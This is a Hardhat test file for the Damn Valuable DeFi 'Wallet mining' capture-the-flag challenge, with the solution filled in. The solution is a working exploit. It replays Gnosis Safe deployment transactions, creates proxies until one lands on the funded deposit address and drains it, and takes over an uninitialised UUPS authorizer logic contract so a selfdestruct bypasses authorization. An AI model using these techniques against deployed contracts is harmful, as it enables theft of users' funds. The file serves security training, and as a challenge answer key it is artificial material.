const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        /* 1. Deploy ProxyFactory and MasterCopy */

        // Found EOA deployer3 (0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A) on etherscan that
        // nonce1: Create Safe Mastercopy (0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F)
        // nonce2: setImplementation
        // nonce3: Create Proxy Factory (0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
        await player.sendTransaction({
            from: player.address,
                to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
                value: ethers.utils.parseEther("1"),
        });
        const {
            CreateMasterCopyRawTxData,
            SetImplementationRawTxData,
            CreateProxyFactoryRawTxData
        } = require('./deployment.json');

        const replayMasterCopy = await (await ethers.provider.sendTransaction(CreateMasterCopyRawTxData)).wait();
        expect(replayMasterCopy.contractAddress).to.be.eq("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F");

        await (await ethers.provider.sendTransaction(SetImplementationRawTxData)).wait();

        const replayProxyFactory = await (await ethers.provider.sendTransaction(CreateProxyFactoryRawTxData)).wait();
        expect(replayProxyFactory.contractAddress).to.be.eq("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");

        const proxyFactory = (
            await ethers.getContractFactory("GnosisSafeProxyFactory")
        ).attach(replayProxyFactory.contractAddress);

        /* Wallet mining: deploy fakeSingleton (logic contract for safeProxy) & safeProxy */
        const fakeSingleton = await (await ethers.getContractFactory("FakeSingleton", player)).deploy();
        let safeProxy;
        for (let i = 0; i < 100; i++) {
            safeProxy = await proxyFactory.connect(player).createProxy(
                fakeSingleton.address,
                fakeSingleton.interface.encodeFunctionData(
                    "drain", 
                    [ token.address, player.address, ]
                )
            );
            if (safeProxy.address == ethers.utils.getAddress(DEPOSIT_ADDRESS)) {  // valid checksum address
                break;
            }
        }
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(DEPOSIT_TOKEN_AMOUNT);

        /* Upgrade authorizer logic contract to fakeAuthorizer */
        const _IMPLEMENTATION_SLOT = '0x' + (BigInt(ethers.utils.id('eip1967.proxy.implementation')) - BigInt(1)).toString(16);
        const authorizerLogicAddr = ethers.utils.hexStripZeros(
            await ethers.provider.getStorageAt(authorizer.address, _IMPLEMENTATION_SLOT)
        );
        const authorizerLogic = (
            await ethers.getContractFactory("AuthorizerUpgradeable")
        ).attach(authorizerLogicAddr);
        // take over the authorizer logic contract since it has not been initialized
        await authorizerLogic.connect(player).init([player.address], [token.address]);
        const fakeAuthorizer = await (await ethers.getContractFactory("FakeAuthorizer", player)).deploy();
        await authorizerLogic.connect(player).upgradeToAndCall(
            fakeAuthorizer.address,
            fakeAuthorizer.interface.encodeFunctionData(
                "destroy",
                [ player.address ]
            )
        )
        // function walletDeploy.can(player.address, any.address) should now pass due to the destruction of the Authorizer logic contract
        expect(await walletDeployer.can(player.address, "0xffffffffffffffffffffffffffffffffffffffff")).to.be.true;
        for (let i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop([]);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
